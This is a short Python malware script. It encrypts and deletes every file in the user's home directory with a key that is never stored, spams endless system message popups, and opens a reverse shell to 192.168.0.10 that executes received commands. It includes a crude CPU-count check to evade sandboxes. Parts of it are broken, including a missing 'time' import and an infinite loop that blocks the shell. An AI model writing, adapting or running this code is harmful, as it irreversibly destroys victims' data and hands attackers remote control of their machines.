import os
import sys

# Encrypter code
# Import coder
from cryptography.fernet import Fernet # type: ignore

# Generate Key
key = Fernet.generate_key()

# Encrypter
def encrypt_file(file_path, key):
    try:
        f = Fernet(key)
        with open(file_path, "rb") as file:
            file_data = file.read()
        encrypted_data = f.encrypt(file_data)
        encrypted_file_path = file_path + ".zlo"
        with open(encrypted_file_path, "wb") as file:
            file.write(encrypted_data)
        print(f'{file_path} encrypted successfully!')
        os.remove(file_path)

    except Exception:
        pass


User_PC = os.path.expanduser('~')

for file in os.listdir(User_PC):
    file_path = os.path.join(User_PC, file)
    if os.path.isfile(file_path):
        encrypt_file(file_path, key)

Desc = 'desc'
osystem = sys.platform

if osystem == 'nt' or osystem == 'cygwin' or osystem == 'win32':
    while True:
        os.system(f'msg * {Desc}')

# Reverse Shell
import os
import socket
import subprocess

if os.cpu_count() <= 2:
    quit()


HOST = '192.168.0.10'  
PORT = 8080 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send(str.encode("[*] Connection Established!")) 
print('\n')

while True:
    try:
        s.send(str.encode(os.getcwd() + "> "))
        print('\n')
        
        data = s.recv(1024).decode("UTF-8")
        data = data.strip('\n')
        
        if data == "quit": 
            sys.exit()
        
        if len(data) > 0:
            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout_value, stderr_value = proc.communicate()
            output_str = stdout_value.decode("cp437") + stderr_value.decode("cp437")
            
            s.send(str.encode(output_str + os.getcwd() + "> "))
    except Exception as e:
        s.send(str.encode("Error occurred: " + str(e) + "\n"))
        time.sleep(10)

s.close()
Desc = 'desc'
if osystem == 'win32' or osystem == 'cygwin':
    while True:
        os.system(f'msg * {Desc}')
else:
    while True:
        os.system(f'echo -e {Desc}') 
